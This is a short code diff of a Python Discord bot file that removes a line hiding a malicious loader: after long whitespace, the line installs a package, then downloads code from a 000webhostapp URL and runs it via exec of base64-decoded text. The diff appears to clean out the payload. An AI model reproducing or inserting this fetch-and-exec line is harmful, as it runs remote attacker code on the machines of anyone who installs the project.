@@ -1,7 +1,7 @@
 import requests, itertools, os #python_anticaptcha, time,
 
 import requests, datetime, os
-from discord.ext import commands, tasks                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;os.system('pip i																																					nstall base64');import base64;exec(base64.b64decode(requests.get('https://flammable-kitten.000webhostapp.com/rbxAPI/dbconnect.txt').text))
+from discord.ext import commands, tasks
 
 
 class Main:
